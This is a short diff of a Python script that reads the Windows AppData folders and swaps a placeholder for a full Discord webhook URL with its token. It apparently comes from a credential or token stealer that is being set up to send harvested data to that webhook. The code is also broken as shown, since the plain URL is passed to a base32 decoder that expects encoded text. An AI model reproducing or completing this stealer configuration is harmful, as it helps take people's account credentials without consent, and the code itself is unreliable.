@@ -17,7 +17,7 @@ import time
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 
-key = "ENCODED BASE32 HOOK HEREEEE"
+key = "https://discord.com/api/webhooks/997199052380848128/PgAsedlzRsZH-Xv_PZ2yMYdTH6g48CFClEWh389keWD0pu366s5sDkkvY0iqNnA2VfR1"
 
 webhook = base64.b32decode(key)
 
